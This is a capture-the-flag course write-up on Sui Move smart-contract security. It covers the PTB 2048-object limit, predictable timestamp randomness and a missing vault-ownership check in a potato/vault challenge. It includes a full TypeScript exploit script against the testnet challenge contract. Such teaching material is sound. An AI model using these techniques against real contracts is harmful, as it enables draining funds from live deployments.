# Week 4

## Course Content

Before diving into the challenge, let's look at the key knowledge in week 4. In the development of Sui Move smart contracts, the interaction between modules is the basis for building complex applications. However, this interaction also introduces new security risks. This chapter explores the security issues of cross-contract interactions in depth, analyze potential risks, and provide practical defense strategies.

> PTB (Programmed Transaction Block) is an advanced feature of Sui blockchain that allows multiple operations to be combined in a single transaction. Unlike the limitation of each transaction in traditional blockchain systems that can only perform a single operation, PTB provides higher flexibility and efficiency. In PTB, developers can combine multiple operations into one transaction and execute them according to specific logic, and operations can also depend on each other.

**One thing we need to know is that Sui PTB has a limit of creating a maximum of 2048 objects at a time.**

```rust
let current_timestamp = clock::timestamp_ms(clock);
let d100 = current_timestamp % 3;
if (d100 == 1) {
    let coin_1 = mint(treasury_cap,ctx);
    coin::join(coin,coin_1);
} else {
    let obj = NoUse {
        id: object::new(ctx),
        value: 100,
    };
    transfer::transfer(obj, tx_context::sender(ctx));
    let burned_coin = coin::split(coin, 5,ctx);
    burn(treasury_cap, burned_coin);
};
```

In this sample contract, we had an rng that gives us 1/3 chance of winning and 2/3 chance of losing. However, the losing logic here will **create one more object** than the winning logic. Therefore, we create 2047 objects in advance. When we win, we will create one object during mint, making it 2048; and when we lose, we will create two objects, exceeding the threshold of 2048. Only the winning logic can be successfully executed to on-chain.

## Task 7

In [task 7](./task7/) we have two contracts about potato and vault. To get flag we need `vault.balance >= 200`, and we get a vault with 100 balance when we init the vault. For potato we have these options:

1. `buy_potato`: Gets a potato, balance - 3
2. `cook_potato`: balance - 1
3. `sell_potato`: Given a vault and a cooked potato, use rng with 1/3 chance of balance + 5 and 2/3 chance of balance unchanged

```rust
entry fun sell_potato(clock: &clock::Clock, vault: &mut Vault, potato: Potato, ctx: &mut TxContext){
    assert!(vault::get_owner(vault) == tx_context::sender(ctx), NO_PERMISSION);
    let current_timestamp = clock::timestamp_ms(clock);
    let d100 = current_timestamp % 3;
    let Potato{id, cooked} = potato;
    assert!(cooked, NO_PERMISSION);
    object::delete(id);
    if(d100 == 1){
        let balance = vault::get_balance(vault);
        set_balance(vault, (balance + 5));
        event::emit(Amount{amount: balance + 5});
    }else{
        let id = object::new(ctx);
        object::delete(id);
    }
}
```

Note that this is an `entry fun` so not callable by Client CLI, only PTB. In fact, there are at least 3 exploit paths I noticed when working on the challenge, and I will explain each of them.

### Solution 1 - PTB Max Limit

As we looked at in above example, PTB has a limit of creating a maximum of 2048 objects at a time. Here in `sell_potato` we have the same bug: for the 2/3 chance, we call `let id = object::new(ctx);`, making one more object than winning logic.

Therefore, we can write a PTB transaction that creates 2048 dummy objects and call `sell_potato` all in the same transaction block. It will only be succeessful if we are in winning logic, otherwise entire tx will be reverted.

To do this, we can write a dummy contract with function like

```rust
 struct Obj has key{
    id: UID
}

public fun new_obj(count: u64, addr: address, ctx: &mut TxContext) {
    let i = 0;
    while (i < count) {
        let obj = Obj { id: object::new(ctx) };
        transfer::transfer(obj, addr);
        i = i + 1;
    }
}
```

And call this with count 2048 in PTB. Then in each round we will make balance increase by 1 (-3-1+5). We will need 100 rounds to get from 100 to 200. This is a really bad method because of how much gas we need during transactions. We can use `client.devInspectTransactionBlock(...)` to estimate gas usage:

```ts
const tx = new Transaction();
tx.moveCall({
    target: `${DUMMY_PACKAGE_ID}::dummy::new_obj`,
    arguments: [tx.pure.u64(2048)],
});

const dryRun = await client.devInspectTransactionBlock({
    sender: address,
    transactionBlock: tx,
});
console.log('Estimated gas used:', dryRun.effects.gasUsed);
```

We get something like

```json
{
  "effects": {
    "messageVersion": "v1",
    "status": {
      "status": "success"
    },
    "executedEpoch": "789",
    "gasUsed": {
      "computationCost": "10000000",
      "storageCost": "2600309600",
      "storageRebate": "0",
      "nonRefundableStorageFee": "0"
    },
```

Most of the gas will be consumed for storage because of the transfer. After running it we see that each run requires 2.6 SUI to complete 😔 We would need hundreds of SUI on Testnet to even finish the exploit, which is definitely not desired.

### Solution 2 - Front-run randomness

In SUI PTB, we know all transactions in the same tx block will preserve the same timestamp. This gives us the second idea:

- In the PTB transaction we pack 100 buy->cook->sell orders together and execute
- Because of `d100 == 1` check, there is a 1/3 chance all txs are guaranteed to be winning and thus increasing balance by 100.
- There's 2/3 chance we lose, but that's fine; we simply create another vault and repeat until we win

I did not code this solution but it should definitely be working.

### Solution 3 - Vulnerability in Vault

I eventually used this solution which I felt less elegant than solution 2 but it works. Basically, the contract does not check if the sold potato belongs to the same vault as bought/cooked potato.

We can init 3 vaults only for buying and cooking. After that, we init a final vault, and for above cooked potatoes, we sell them targeting at this final vault. Since 1/3 chance of winning, and 3 vaults give 75 cooked potatoes, we will get roughly 25 wins which is above 100 balance.

The solution is kept in [sui-ptb-potato](./sui-ptb-potato/). Code should be self-explanatory.

```ts
import { Transaction } from '@mysten/sui/transactions';
import { SuiClient, getFullnodeUrl } from '@mysten/sui/client';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import axios from 'axios';

const MNEMONIC = ''; // your mnemonic here
const PACKAGE_ID = ''; // your package ID
const suiRpcUrl = 'https://fullnode.testnet.sui.io/';
const CLOCK_ID = '0x6';

const keypair = Ed25519Keypair.deriveKeypair(MNEMONIC);
const publicKey = keypair.getPublicKey();
const address = publicKey.toSuiAddress();
console.log('Address:', address);

const client = new SuiClient({ url: getFullnodeUrl('testnet') });

async function main() {
    let balance = await client.getBalance({ owner: address });
    console.log('Account Balance:', balance);
    await farmTo200();
}

async function getPotatoId(isCooked: boolean): Promise<string> {
    let cursor = null;
    for (;;) {
        const objects = await client.getOwnedObjects({ owner: address, cursor: cursor });
        const objectsContent = await client.multiGetObjects({
			ids: objects.data.map((o) => o.data?.objectId!),
			options: { showContent: true },
		});
        for (const o of objectsContent) {
            let curr = o.data?.content;
            // @ts-ignore
            if (curr.dataType == 'moveObject' && curr.type.includes(`${PACKAGE_ID}::potato::Potato`) && curr.fields.cooked == isCooked) {
                // @ts-ignore
                return curr.fields.id.id;
            } 
        }
		if (objects.hasNextPage) {
            console.log("New page");
			cursor = objects.nextCursor;
		} else {
			cursor = null;
            throw new Error('Finished');
		}
    }
}

async function getVaultBalance(vaultId: string): Promise<number> {
    const res = await axios.post(suiRpcUrl, {
        jsonrpc: '2.0',
        id: 1,
        method: 'sui_getObject',
        params: [vaultId, {
            showContent: true,
        }]
    }, {
        headers: { 'Content-Type': 'application/json' }
    });

    const balance = parseInt(
        // @ts-ignore
        res.data?.result?.data?.content?.fields?.balance ?? '0',
        10
    );
    return balance;
}

async function initVault() {
    const tx = new Transaction();
    tx.moveCall({
        target: `${PACKAGE_ID}::vault::init_vault`,
        arguments: [],
    });
    const result = await client.signAndExecuteTransaction({
        signer: keypair,
        transaction: tx,
    });
    console.log('Vault created:', result.digest);
}

async function buyAndCookPotato(vaultId: string) {
    const tx = new Transaction();
    tx.moveCall({
        target: `${PACKAGE_ID}::potato::buy_potato`,
        arguments: [tx.object(vaultId)],
    });

    const result = await client.signAndExecuteTransaction({
        signer: keypair,
        transaction: tx,
    });
    console.log('✅ Bought potato:', result.digest);
    const potatoId = await getPotatoId(false);
    console.log('➡️  Got potato ID:', potatoId);

    const tx2 = new Transaction();
    tx2.setGasBudget(100_000_000);
    tx2.moveCall({
        target: `${PACKAGE_ID}::potato::cook_potato`,
        arguments: [
            tx2.object(vaultId),
            tx2.object(potatoId),
        ]
    });

    const result2 = await client.signAndExecuteTransaction({
        signer: keypair,
        transaction: tx2,
    });
    console.log('✅ Cooked potato:', result2.digest);
}

async function sellPotato(vaultId: string) {
    const potatoId = await getPotatoId(true);
    console.log('➡️ Got cooked potato ID:', potatoId);

    const tx = new Transaction();
    tx.setGasBudget(100_000_000);

    tx.moveCall({
        target: `${PACKAGE_ID}::potato::sell_potato`,
        arguments: [
            tx.object(CLOCK_ID),
            tx.object(vaultId),
            tx.object(potatoId),
        ]
    });

    const result = await client.signAndExecuteTransaction({
        signer: keypair,
        transaction: tx,
    });
    console.log('🎯 Sold potato:', result.digest);
}

async function farmTo200() {
    // run init vault 4 times to get 3 vaults for farm+cook 50 times + 1 vault for sell
    // await initVault();
    // await initVault();
    // await initVault();
    // await initVault();
    // throw new Error('Vaults initialized, now you can farm!');
    const vaultForFarms: string[] = [
        "0x013a0ca14a47efa90905296173084c192d79c19d4450be56de738a3df1643149",
        "0x825493b18fabef40f3d9e0132ec38251893bd5f2b0f2f0fcc98f160916cad079",
        "0x92aa249a3900a7cf12ef48428b8dd52d6387304f99aedddd257ee0ba345f9a94"
    ]
    const vaultId = "0x61599983f41413504b00e25730177392df13bd2fbf1f61095e0bfb1af1c80279";

    for (const vaultForFarm of vaultForFarms) {
        while (true) {
            const balance = await getVaultBalance(vaultForFarm);
            console.log('Current balance for vaultForFarm:', balance);
            if (balance <= 3) break;
            await buyAndCookPotato(vaultForFarm);
        }
    }

    // now sell potatos on vault
    while (true) {
        const balance = await getVaultBalance(vaultId);
        console.log('Current balance for vault:', balance);
        if (balance >= 200) break;
        await sellPotato(vaultId);
    }

    const tx = new Transaction();
    tx.moveCall({
        target: `${PACKAGE_ID}::vault::get_flag`,
        arguments: [tx.object(vaultId)],
    });

    const result = await client.signAndExecuteTransaction({ signer: keypair, transaction: tx });
    console.log('🎉 Flag Transaction Sent:', result.digest);
}

main().catch(e => {
    console.error('Error in main:', e);
});
```